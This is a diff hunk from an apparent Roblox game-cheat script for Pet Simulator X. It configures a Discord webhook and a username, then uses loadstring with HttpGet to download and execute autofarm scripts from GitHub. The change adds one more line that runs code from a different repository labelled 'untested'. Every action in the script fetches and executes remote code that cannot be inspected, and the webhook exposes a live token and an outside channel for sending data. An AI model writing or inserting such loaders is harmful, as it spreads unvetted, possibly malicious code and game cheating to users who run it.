@@ -3,3 +3,4 @@ _G.WebHook = "https://discord.com/api/webhooks/1061617319199129691/2rA5_qHdSvbnj
 loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
 _G.UserName = "pogchampcheat"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/untested/main/load.lua", true))()
